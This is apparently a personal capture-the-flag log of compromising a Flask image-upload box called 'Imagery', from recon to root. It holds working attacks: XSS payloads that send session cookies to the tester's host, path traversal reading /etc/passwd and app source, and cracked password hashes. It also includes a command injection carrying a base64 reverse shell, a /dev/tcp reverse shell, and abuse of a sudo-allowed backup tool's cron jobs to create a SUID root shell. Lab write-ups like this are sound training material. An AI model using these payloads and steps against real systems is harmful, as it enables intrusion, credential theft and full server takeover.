Okay NMAP scan has 2 ports open

Port 22/SSH and Port 8000/HTTP Flask Server

[2025-09-29 10:42:38] Lets do ffuf dirbusting. 

[10:47:33] Lets do explore the website in mean time . Found this email support@imagery.com


[10:48:55]  SQLi is not possible from UI . It is not submitting the requeest
[10:49:55]  Registered and login succesfully 
[10:50:18]  Here we can upload images it seems . And we have this account ID from the upload dialog box 5c7ac980
[10:54:11]  While filling dialog box ,we can add images to groups existing or create new one . When creating it says feature still in development . So there must be .git folder repo or a subdomain for development 

[10:56:04] Uploaded successfully and we can see that images in the group tab which we added. And the name we added <i>Batman</i> is being validated . It is removing angle brackets and we can only iBatman/i as name ------------ CHECK THIS

[10:57:55] Download option is making this request http://10.10.11.88:8000/uploads/71ff5bd0-c178-4e71-bb89-66ed91f21b5e_Batman.jpg

[11:00:02]  But when I do same visit in the browser , it is viewing the image and not downloading it 
[11:01:36]  Now uploading again the same image but this time the name is &lt;i&gt;Batman&lt;/i&gt; . To see what happens and the images are being deleted with a cronojob or a service running I guess 

[11:02:33]  And the decription of image too &lt;i&gt;Batman&lt;/i&gt;
[11:03:12] Okay now I can see <i>Batman</i> as name and description , no HTML rendering

[11:03:57]  GET request via browser views http://10.10.11.88:8000/uploads/ed297d95-8e01-4d9d-afd3-dfb4d55c7b53_Batman.jpg

[11:07:39]  LFI doesn't seem to be vulnerable
[11:09:00] And the view page source seems to have a lot of JS code . So there may not be seperate JS files for this and I see one endpoint admin while scrolling through the JS code in view page source
	- window.location.origin}/admin/delete_user`

[11:10:20] Lets see what else endpoints we can with admin
	- window.location.origin}/admin/delete_bug_report
	- /admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log
	- window.location.origin}/admin/delete_user
	- /admin/users

[11:12:36]  And this we got from dirbusting with this wordlist /home/r3b00t/Tools/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
	images                  [Status: 401, Size: 59, Words: 4, Lines: 2, Duration: 222ms]
	register                [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 220ms]
	login                   [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 233ms]
	logout                  [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 220ms]
	upload_image            [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 227ms]
	:: Progress: [38267/38267] :: Job [1/1] :: 88 req/sec :: Duration: [0:08:12] :: Errors: 0 ::

[11:13:25] Lets try another wordlist cause we missed admin in the above output , maybe how many more we missed
[11:14:24] While we run this , lets see what we can do with subdomain without the domain ------- CHECK THIS
[11:16:31] And the nmap results says this - _http-server-header: Werkzeug/3.1.3 Python/3.12.7 . Lets see what vulns are there for these versions 

[11:23:57]  No active vulns for that server version 
[11:24:58] Yeah but we can forge cookies if we have secret key 
[11:27:21] But we can crack cookies for SECRET_KEY if it is weak with flask-unsign tool

[11:38:00] No signs of bruteforcing the SECRET KEY . Throwing errors when decoding
[11:40:41] Figured out , why the error was - The keys from the wordlist like numbers 1234 as treated as int and not string . Thats why this error

[11:42:38] And we used this command arg --no-literal-eval to avoid this error
[11:45:01]  So we cant think of session hijacking or cookie forging without SECRET_KEY. Lets see file upload vulnerabilities for reverse shell

[11:50:14] Created a rce.py file , lets upload it via burp and see 

[11:59:21]  So uploading file with .py didnt work . And I had to change .py . jpg . Then only it allowed 

[12:01:32] It didn't work , says this error when navigating

[12:02:58] Taking BREAKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKk


-------------------- 02-OCTOBER-2025 ---------------------------


[22:43:36] Okay back from break and starting again now huhh.
[22:44:12] Googling for Python version vulns 3.12.7 . Nothing I could found ----------------- CHECK AGAIN
[22:49:46] Since the server is flask . maybe it is vulnerable to Jinja exploits
[22:50:40] Drank coffee break 
[22:59:56] BACK FROM BREAKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK

[23:00:12] Lets try this jinja DTL in Burp . Didn't work .
[23:08:50] Tried from Burp and this isn't working
[23:17:42]  Found a blog on how flask is vuln to SSRF . Lets try that . I'll start my python webserver and see if the HTTP requests pings the server . 
[23:20:13] Nope that doesn't work at all
[23:22:39] Lets google if there are any file upload vulnerabilities for this python or flask server version
[23:24:06] Nope nothing found . Maybe an UDP scan works . Lets rustscan it 
[23:32:30] Uploaded file with this file name - ./../../../../../../../../../../../../../etc/Batman.jpg
[23:32:46] Lets see if this works . And the URL it generated is http://10.10.11.88:8000/uploads/f7f9490a-ea98-4459-b76a-7fd178df087c_etc_Batman.jpg
[23:35:12] So it is sanitizing the URLs . What to do ????
[23:35:51] Lets visit admin users and see what we get . 
[23:36:36] This is what we get . 
	message	"Access denied. Administrator privileges required."
	success	false
[23:36:46] Can we tamper cookies without the secret key ??
[23:37:51] Debbuger and console endpoint also no luck
[23:39:15] Tried LFI again with view image . Nope
[23:40:50] I have a view page source code of register functionality , but it is strange. 
[23:43:12] Nope , nothing flaw
[23:47:39] Checking the same for login too 
[23:49:44] Checking if we can access admin endpoint
[23:52:09] Lets send isAdmnin true with login to see what we get. 
[23:58:39] Nope , nothing we got from setting isAdmin = true in the login payload
[23:59:11] Maybe in register endpoint ??
[00:00:02] It was successful sending isAdmin true in register . Lets login and see what we get 
[00:03:40] Regular homescreen , but when I navigate to /admin/users , same access denied message
[00:08:22] Lets see file upload in view page source . Nope
[00:20:11] Did flask-unsign decode , and now trying if I can modify params of decoded cookie and send request to get admin access
[00:22:46] Nope thats not possible but it was worth a try. 
[00:22:58] Seeing if we can do subdomain host in URL
[00:27:08] Oh theere is a bug report link which I've missed

<img src=x onerror=“new Image().src=‘http://10.10.14.11:8000/?=‘+encodeURIComponent(document.cookie)">

<img src=x onerror=fetch('http://10.10.14.11:8000/?c='+btoa(document.cookie))>

[00:48:28] The above fetched me cookie in base64 and I've decoded and navigated to /admin/users . And this is what I got

{"anyAdminExists":true,"success":true,"users":[{"displayId":"a1b2c3d4","isAdmin":true,"isTestuser":false,"username":"admin@imagery.htb"},{"displayId":"e5f6g7h8","isAdmin":false,"isTestuser":true,"username":"testuser@imagery.htb"}]}

[00:49:44] And there is a admin panel
[00:50:41] And we can do ffuf with this admin account session for dirbusting
[00:52:01] Lets take a break and start tomorrow 


-------------------- 03-OCTOBER-2025 -------------------------------
[09:26:28] Okay you'll get bug report XSS callback when you upload an image . Huhh 
[09:34:50] Lets revisit the dir bustinng ouput to see what endpoints we can visit as admin .
[09:37:57] Running ffuf with new wordlist with admin session and visited the debug and console endpoints . But NOPE
[09:39:37] Lets see what download log button gives out
[09:40:35] Okay we have LFI from the get_system_log endpoint
	- http://10.10.11.88:8000/admin/get_system_log?log_identifier=/../../../../../../../../../etc/passwd

[09:41:06] And we have these users
	- root:x:0:0:root:/root:/bin/bash
	- web:x:1001:1001::/home/web:/bin/bash
	- mark:x:1002:1002::/home/mark:/bin/bash

[09:43:07] Lets see etc/hosts and see what we can get
	127.0.0.1 localhost
	127.0.0.1 Imagery imagery.htb

[09:44:11] Maybe there is a folder in /var/www called imagery.htb ??
[09:44:37] And lets look at flask dir structure to see what we can get interestingly

	my-flask-app/
	├── app/
	│   ├── __init__.py
	│   ├── views.py  # or routes.py
	│   ├── models.py
	│   ├── forms.py
	│   ├── static/
	│   │   ├── css/
	│   │   │   └── style.css
	│   │   ├── js/
	│   │   │   └── main.js
	│   │   └── img/
	│   │       └── logo.png
	│   └── templates/
	│       ├── base.html
	│       ├── index.html
	│       └── auth/
	│           └── login.html
	├── config.py
	├── run.py
	├── requirements.txt
	├── .flaskenv
	└── venv/

[09:45:40] Maybe we can get .flaskenv if we get the root dir right. Tried but didn't
[09:48:00] But I got app.py
	- http://10.10.11.88:8000/admin/get_system_log?log_identifier=../app.py

[09:49:30] NOthing fancy from app.py . Downloaded config.py
	- We get this DATA_STORE_PATH = 'db.json'

[09:51:30] Downloaded db.json file too . And got these 
	"username": "admin@imagery.htb",
    "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",

    "username": "testuser@imagery.htb",
    "password": "2c65c8d7bfbca32a3ed42596192384f6",

[09:52:46] Lets crack them . 
[09:55:33] And we got testuser@imagery.htb as iambatman
[09:55:48] Maybe the creator is a batman fan just like me . I was also uploading batman images xD
[09:56:18] Okay lets use this password for found linux account via SSH
	└─$ ssh web@10.10.11.88
	web@10.10.11.88: Permission denied (publickey).

[09:59:15] Maybe no access via password. Need public key I guess
[09:59:32] Lets login as the testuser and see what did he upload
[10:01:41] He didnt upload anything , but he can create groups . If I can point that group uploads to root dir , I can run a python reverse shell and get it maybe

[10:02:20] Taking BREAKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK

[10:11:21] Back from break . Lets explore this account and see
[10:13:09] Creating groups is not possible , it is saying GroupName cannot be empty even when provided. Lets see what it the source code for this. View Page Source.
[10:14:58] Nothing I can find. Lets see app.py again and understand its functionality. Maybe there is a code injection ??

[10:18:11] There are registered blueprints in app.py ------------------------ CHECK THIS
	- app_core.register_blueprint(bp_auth)
	- app_core.register_blueprint(bp_upload)
	- app_core.register_blueprint(bp_manage)
	- app_core.register_blueprint(bp_edit)
	- app_core.register_blueprint(bp_admin)
	- app_core.register_blueprint(bp_misc)

[10:18:27] And there is environment variable in config.py . Lets see what is it from /proc/self/environ 
	- Nope found empty

[10:21:23] And we found this in config.py ----------------------------------- CHECK THIS 
	BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
	BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')


[10:22:24] Lets look for SSH private keys in home dirs of the account as password login is denied and we need key
[10:26:30] Couldn't find keys private keys

[10:31:04] The X-Bypass-Lockout header is used for rate limiting . If it is not given , account lockout is possible . 
[10:32:02] So the Header expects CRON_BYPASS_TOKEN env var as value , but since there is no such env var from earlier checking environ file , we can use default-secret-token-for-dev to bypass lockout 

[10:32:55] But what can we do with it ? Bruteforce . But what ????? 
[10:33:08] We can bruteforce SECRET_KEY as it randomly generated , but it is only good for session keys . But how do we get RCE from it ???

[10:38:19] Checking blueprints , like what can we do with it
[10:39:02] Maybe they are present inside routes folder . Lets see . Nope no routes folder I guess
[10:43:07] From ffuf dir busting I can see there is a utils.py file
[10:46:33] Just how the app is configured in backend . Nothing useful I believe
[10:53:22] Shit in app.py , the packages imported are files actually . So we have the below files
	api_auth.py
	api_upload.py
	api_manage.py
	api_edit.py
	api_admin.py
	api_misc.py

[10:55:10] Lets download them
[10:57:22] BREAKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkk

[12:08:27] Back from the break

[12:15:58] API EDIT file has a a conversion type - crop where we can generate shell when subprocess is ran. Just need to figure out how . Now I need to figure out how to send an API request or whatever is it to get shell

[12:22:07] apply_visual_transform is the endpoint
	- http://$IP:8000/apply_visual_transform

[12:22:44] And we have to do this from test user account only

[12:23:41] We need JSON payload with these params
	- imageId
	- transformType --- which could be crop
	- And we need to upload an image and findout the ID of it 
	- And the image must be in the allowed mime type list
	- And extension should be in allowed list

[12:29:23] We have to modify the extension some how to allow command injection
[12:30:46] Or there is a params dict in payload "x" and "y" "width" and "height"

[12:31:47] Lets send the request , we can upload file and get its ID by dumping db.json file

[12:33:53] Uploaded a file and dumped db.json file

[12:34:27] This is the id - 6ed3b6c0-826d-4894-a3b4-d2b6c693652a

[12:34:59] Now sending curl request 
	- curl -H "Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aN9RUw.OWHWbAClXsoFgs1Uk0yytql60oQ" http://$IP:8000/apply_visual_transform --json '{"imageId":"6ed3b6c0-826d-4894-a3b4-d2b6c693652a", "transformType" : "crop", "params" : "{'x': 20,
	'y': ; 10,
	'width' : 'echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEvNDQ0NCAwPiYxCg== | base64 -d | bash #',
	'height' : 222}"}'


[12:49:06] Created the python program for the same above payload and request . Lets run it and see if we get shell
[12:50:23] We need to add Content-Type too . Lets add it in the program

[13:02:35] And we got the reverseShell of web account

[13:04:01] Now lets do some recon
[13:09:08] There is a backup folder inside /var/
[13:09:22] Lets dump it locally and see what it is
[13:23:33] It is encrypted . How to unzip it . 
[13:23:41] And I got this 
	PASSWORD = "strongsandofbeach"
	BYPASS_TOKEN = "K7Zg9vB$24NmW!q8xR0p%tL!"


[13:43:56] Lets wait and crack it using bruteforce . Until then BREAKKKKKKKKKKKKKKKKKk

[14:13:08] Cracked the file password - bestfriends
[14:18:13] We need this pip3 install pyAesCrypt to decrypt the file

[14:20:17] Decypted and read db.json file and it has this 
	mark : 01c3d2e5bdaf6134cec0a367cf53e535

[14:21:13] And it decrypted to supersmash
[14:21:22] Lets SSH into mark account . We cant . So just su mark and switch accounts

[14:23:38] Mark can use (ALL) NOPASSWD: /usr/local/bin/charcol as root . Lets see what it is

[14:27:16] We can start an interactive shell , but it requires password . I've resetted the password to default . 
which is no password mode . And have to restart the application now

[14:27:48] Lets See how . 
[14:30:38] Ran the same charcol command and I was able to reset to no password and get shell

[14:30:55] Now figuring out how to get rootshell
[14:34:33] We can backup files , as we run this as root , so the files will also be as root . Then we can extract the files 
In this backup file , we need to place a suid rootshell .

[14:35:14] Lets write a C code to get that . 
[14:39:31] Nope that maynot be possible , as we are backing up and not running . Maybe we can dump root dir and get shell if it has private SSH keys . huhh

[14:40:05] Lets do that. So created a tmp folder , /tmp/r3b00t and the backup will be placed there and will be extracted there
[14:46:43] No I cant dump /root folder . Access denied. Maybe we can do something with cron jobs

[14:50:27] No we can do backup 
sudo $charcol backup -i /root/ -o /tmp/r3b00t/backup --no-timestamp --name rootDump

[14:59:11] Added the cronjob , lets wait for a min and see if it dumps the root dir in the backup
[15:00:33] the dir has a file , but not sure if it is cron generated . Deleted that and lets wait for a min to see if it generates again
[15:01:22] Nope cant see the file now
[15:01:52] And the job is also delted . Lets add again
	- auto add --schedule "* * * * *" --command "charcol backup -i /root/ -o /tmp/r3b00t/backup --no-timestamp" --name "rootDump"

[15:03:39] charcol> auto list
	[2025-10-03 09:33:11] [INFO] Charcol-managed auto jobs:
	[2025-10-03 09:33:11] [INFO]   ID: 05153e97-e8ae-4227-ae62-104cd3ec1879
	[2025-10-03 09:33:11] [INFO]   Name: rootDump
	[2025-10-03 09:33:11] [INFO]   Command: * * * * * CHARCOL_NON_INTERACTIVE=true charcol backup -i /root/ -o /tmp/r3b00t/backup --no-timestamp

[15:03:58] I think the file was added by cron , i deleted because of timestamp. But there is no file now too

[15:05:23] Lets add cron job this time with log file
	- auto add --schedule "* * * * *" --command "charcol backup -i /root/ -o /tmp/r3b00t/backup --no-timestamp" --name "rootDump" --log-output /tmp/r3b00t/backup.log

[15:08:03] The log shows it is cleaning the archive file too . Thats why we are not seeing it 
	
	[2025-10-03 09:37:01] [INFO] No encryption password provided and application is in 'no password' mode. Creating unencrypted 	archive.
	[2025-10-03 09:37:01] [INFO] Output file will be: /tmp/r3b00t/backup.zip
	[2025-10-03 09:37:01] [INFO] Creating temporary archive: /tmp/r3b00t/backup.zip of type zip...
	[2025-10-03 09:37:01] [INFO] Temporary archive created successfully at /tmp/r3b00t/backup.zip
	[2025-10-03 09:37:01] [INFO] Set permissions for temporary archive file to 0o664
	[2025-10-03 09:37:01] [INFO] Set ownership for temporary archive file to root:root
	[2025-10-03 09:37:01] [INFO] Moving unencrypted archive to final destination: /tmp/r3b00t/backup.zip...
	[2025-10-03 09:37:01] [INFO] Unencrypted backup saved to: /tmp/r3b00t/backup.zip
	[2025-10-03 09:37:01] [INFO] Set permissions for final output file to 0o664
	[2025-10-03 09:37:01] [INFO] Set ownership for final output file to root:root
	[2025-10-03 09:37:01] [INFO] Cleaned up temporary archive file: /tmp/r3b00t/backup.zip


[15:08:46] Lets see about the cleaning archive file ,
[15:09:46] There is no such option for archive cleanup . Lets add password now this time and see and remove the timestamp arg too
	- auto add --schedule "* * * * *" --command "charcol backup -i /root/ -o /tmp/r3b00t/backup -p haha" --name "rootDump" --log-output /tmp/r3b00t/backup.log

[15:10:54] Lets see what happens this time. 
[15:11:11] Okay there is a backup file now . So we should add password . Huhh
[15:11:27] Lets dump it locally and extract . 
[15:12:51] Nope it shows empty . Lets extract it from the charcol application itself. 
[15:17:43] Nope that shows empty

[15:17:48] Lets edit the cron job 
	- auto add --schedule "* * * * *" --command "charcol backup -i /root -o /tmp/r3b00t/backup -p haha" --name "rootDump" --log-output /tmp/r3b00t/backup.log

[15:20:26]  Nope that didnt work  .Lets add suid C program , backup and then extract or copy /bin/bash and backup and then decrypt it and see
	- auto add --schedule "* * * * *" --command "charcol backup -i /bin/bash -o /tmp/r3b00t/backup -p haha --no-timestamp" --name "binBashBkp"  --log-output /tmp/r3b00t/backup.log

[15:30:24] Now working . Lets try not to add -o and 
	- auto add --schedule "* * * * *" --command "charcol backup -i /bin/bash -p haha --no-timestamp" --name "binBashBkp"  --log-output /tmp/r3b00t/backup.log

[15:37:53] That didnt work . Maybe we need to copy binBash file and backup that one I guess
	- auto add --schedule "* * * * *" --command "charcol backup -i /tmp/r3b00t/bash -o /tmp/r3b00t/rshell -p haha --no-timestamp" --name "binBashBkp"  --log-output /tmp/r3b00t/backup.log

[15:40:15] Added this one , lets see what happens . 
[15:41:52] Yeah now I can see bash file when listing . Lets extract it

auto edit 8a47f12b-48da-4828-a0ac-3b81e2468bb4 --schedule "* * * * *" --command "charcol backup -i /tmp/r3b00t/bash -o /tmp/r3b00t/rshell2 -p haha --no-timestamp" --name "binBashBkp2"  --log-output /tmp/r3b00t/backup.log

[15:52:55] Lets see what can we do 
[15:59:01] Lets see if we can add regular bash commands
	auto add --schedule "* * * * *" --command "cp /bin/bash /tmp/r3b00t/rootShell3; chmod u+s /tmp/r3b00t/rootShell3" --name "binBashBkp3"  --log-output /tmp/r3b00t/backup.log


[16:01:09] Lets see what happened . Shit I am stupid . We can run normal bash commands , i thought the --command in auto add was exclusive to the application commands only . Looks like we can add system commands too here

[16:04:38] It worked , but not able to get rootshell
	- -rwsr-xr-x  1 root root 1.5M Oct  3 10:32 rootShell3


auto edit 5fe76728-a07a-4159-9478-76401da09521 --schedule "* * * * *" --command "/tmp/r3b00t/rshellC" --name "binBashBkp4"  --log-output /tmp/r3b00t/backup4.log

[16:13:16] Okay compiled C code and added it to run as cron job. Lets see what happens

[16:16:58] Maybe we need to copy the file from /usr/bin

[17:14:35] Lets start another nc listeneer 
	- sh -i >& /dev/tcp/10.10.14.11/8188 0>&1

auto add --schedule "* * * * *" --command "/tmp/varRootShell" --name "varRootShell"  --log-output /tmp/r1.log

[19:05:27] I've figured out why the rootshell was not working . It is because there maybe nosuid=1 on /tmp which doesnt allow executing suid bits on /tmp

[19:10:08] This confirms why the suid was not working on /tmp folder
	root@Imagery:/root# mount | grep "/tmp"
	tmpfs on /tmp type tmpfs (rw,nosuid,nodev,size=1979616k,nr_inodes=1048576,inode64)



------ SECRETS FOUND ---------
[ EMAIL ] support@imagery.com 
[ ACCOUNT-ID ] 5c7ac980
[ LINUX ACCOUNTS ] root:x:0:0:root:/root:/bin/bash
[ LINUX ACCOUNTS ] web:x:1001:1001::/home/web:/bin/bash
[ LINUX ACCOUNTS ] mark:x:1002:1002::/home/mark:/bin/bash
[ APPLICATION ACCOUNT ] admin@imagery.htb : 5d9c1d507a3f76af1e5c97a3ad1eaa31 [ NOT FOUND ]
[ APPLICATION ACCOUNT ] testuser@imagery.htb : 2c65c8d7bfbca32a3ed42596192384f6 [ iambatman ]
[ AES FILE PASSWORD ] bestfriends
[ APPLICATION ACCOUNT ] mark@imagery.htb : 01c3d2e5bdaf6134cec0a367cf53e535 [ supersmash ]

